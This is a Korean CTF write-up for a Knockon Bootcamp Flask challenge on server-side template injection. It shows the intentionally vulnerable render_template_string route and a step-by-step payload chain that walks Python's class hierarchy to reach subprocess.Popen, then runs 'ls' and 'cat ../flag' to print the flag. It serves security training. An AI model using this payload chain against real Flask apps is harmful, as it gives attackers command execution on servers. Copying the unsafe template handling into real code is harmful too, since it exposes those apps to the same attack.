---
title: "[Writeup] Knockon Bootcamp - 8.1 SSTI - server flag"
categories:
  - Web Hacking
tags:
  - Writeup
  - Knockon Bootcamp
  - Server Side Template Injection
last_modified_at: 2024-09-15T14:00:00-05:00
published: true
---

|

## 문제

<http://war.knock-on.org:10004/>

![8.1 SSTI - server flag 1](/assets/images/writeup/web-hacking/knock-on/8-1_SSTI_1.png)

![8.1 SSTI - server flag 2](/assets/images/writeup/web-hacking/knock-on/8-1_SSTI_2.png)

![8.1 SSTI - server flag 3](/assets/images/writeup/web-hacking/knock-on/8-1_SSTI_3.png)

|

|

|

### 목표

---

서버 내부 정보를 노출시켜 FLAG 찾기

|

### 공격 기법

---

Server Side Template Injection

|

|

|

## 문제 코드

```python
from flask import Flask, request, render_template_string, render_template
import os

app = Flask(__name__)
app.secret_key = os.getenv("FLAG")

@app.route("/")
def home():
    return render_template("index.html")

@app.route("/ssti", methods=["GET", "POST"])
def ssti():
    result = None
    if request.method == "POST":
        payload = request.form["payload"]
        result = render_template_string(f"{payload}")
    return render_template("ssti.html", result=result)

if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=10004)

```

|

|

|

## 코드 분석

```python
@app.route("/ssti", methods=["GET", "POST"])
def ssti():
    result = None
    if request.method == "POST":
        payload = request.form["payload"]
        result = render_template_string(f"{payload}")
    return render_template("ssti.html", result=result)
```

POST요청이 들어오면 `payload`폼의 데이터를 저장 후 템플릿 문자열로 처리해 화면에 출력

템플릿 문자열로 처리한다는 것은 사용자가 템플릿 엔진의 기능을 활용할 수 있게 하여 서버 데이터에 접근할 수 있다는 뜻

|

|

|

## Exploit

```bash
100*100
```

![8.1 SSTI - server flag 4](/assets/images/writeup/web-hacking/knock-on/8-1_SSTI_4.png)

문자열로 출력이 되지 않고 `10000`이 출력됨.

템플릿 엔진이 사용자가 입력한 명령어를 실행함

|

```python
"".__class__
```

![8.1 SSTI - server flag 5](/assets/images/writeup/web-hacking/knock-on/8-1_SSTI_5.png)

`__class__`: Python 객체는 모두 `__class__` 속성을 가짐

`“”`의 클래스는 `str`

|

```python
"".__class__.__mro__
```

![8.1 SSTI - server flag 6](/assets/images/writeup/web-hacking/knock-on/8-1_SSTI_6.png)

`__mro__`: `Method Resolution Order`. 메서드 결정 순서. 상위 클래스일수록 나중에 출력됨

`“”`의 클래스인 `str`이 가장 먼저 출력되고, 최상위 클래스인 `object`이 가장 나중에 출력됨

`Python`의 모든 클래스는 최종적으로 `object` 클래스를 상속받기 떄문

[파이썬(python) - MRO(Method Resolution Order)](https://tibetsandfox.tistory.com/26)

위 블로그를 참고

|

```python
"".__class__.__mro__[1]
```

![8.1 SSTI - server flag 7](/assets/images/writeup/web-hacking/knock-on/8-1_SSTI_7.png)

모든 클래스는 상위 클래스로 `object`를 가지므로, 여기서부터 원하는 필요한 메서드를 참조할 수 있음

|

```python
"".__class__.__mro__[1].__subclasses__()
```

![8.1 SSTI - server flag 8](/assets/images/writeup/web-hacking/knock-on/8-1_SSTI_8.png)

`__subclasses__()`: 서버의 Python 환경에서 정의된 모든 클래스 목록 조회

`object` 클래스의 모든 서브 클래스 나열

|

```bash
os.system

subprocess.Popen

subprocess.run

subprocess.call
```

시스템 명령을 실행할 수 있는 클래스들임

|

![8.1 SSTI - server flag 9](/assets/images/writeup/web-hacking/knock-on/8-1_SSTI_9.png)

현재 사용할 수 있는 클래스는 `subprocess.Popen`임

|

```python
"".__class__.__mro__[1].__subclasses__()[330:]
```

![8.1 SSTI - server flag 10](/assets/images/writeup/web-hacking/knock-on/8-1_SSTI_10.png)

슬라이싱을 통해 몇 번째 클래스가 `subprocess.Popen`인지 찾아야함

|

```python
"".__class__.__mro__[1].__subclasses__()[351]
```

![8.1 SSTI - server flag 11](/assets/images/writeup/web-hacking/knock-on/8-1_SSTI_11.png)

찾음

|

```python
"".__class__.__mro__[1].__subclasses__()[351]('ls', shell = 1, stdout = -1).communicate()
```

![8.1 SSTI - server flag 12](/assets/images/writeup/web-hacking/knock-on/8-1_SSTI_12.png)

`stdout=-1` or `stdout=subprocess.PIPE`: 
출력 결과를 `프로세스.communicate()`를 통해 캡처. stdout에서 출력 결과를 읽을 수 있게 함

`shell = 1`: 명령어가 쉘을 통해 실행됨

복잡한 명령어를 실행할 때 유용

여기선 `stdout=subprocess.PIPE`가 안됨

|

```python
"".__class__.__mro__[1].__subclasses__()[351](['ls', '..'] , stdout = -1).communicate()
```

`shell` 없이 실행하려면 `[’ls’, ‘..’]` 형식으로 명령어를 주면 됨

|

```python
"".__class__.__mro__[1].__subclasses__()[351]('ls ..', shell = 1, stdout = -1).communicate()
```

![8.1 SSTI - server flag 13](/assets/images/writeup/web-hacking/knock-on/8-1_SSTI_13.png)

상위 경로에 flag가 있음

|

```python
"".__class__.__mro__[1].__subclasses__()[351]('cat ../flag', shell = 1, stdout = -1).communicate()
```

![8.1 SSTI - server flag 14](/assets/images/writeup/web-hacking/knock-on/8-1_SSTI_14.png)

굿

|

## payload

```python
"".__class__.__mro__[1].__subclasses__()[351]('cat ../flag', shell = 1, stdout = -1).communicate()
```

|

|

### FLAG

---

```bash
K0{sst1_m4k3_m3_cr4zzzy}
```

|

|

|

## References

<https://tibetsandfox.tistory.com/26>

|

---